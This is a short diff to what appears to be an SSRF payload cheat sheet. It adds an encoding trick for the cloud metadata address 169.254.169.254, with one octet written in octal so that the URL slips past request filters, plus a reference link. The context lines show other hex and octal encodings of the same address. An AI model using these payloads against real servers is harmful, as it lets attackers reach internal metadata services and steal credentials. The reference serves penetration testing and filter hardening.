@@ -573,6 +573,7 @@ http://0xA9FEA9FE/ Dotless hexadecimal
 http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
 http://0251.0376.0251.0376/ Dotted octal
 http://0251.00376.000251.0000376/ Dotted octal with padding
+http://0251.254.169.254 Encode 1 octet of the IP address or 2 or 3 (Just don't encode all)
 ```
 
 More urls to include
@@ -856,3 +857,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
 - [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
 - [Attacking Url's in JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
+- [SSRF: Don't encode entire IP](https://twitter.com/thedawgyg/status/1224547692967342080)
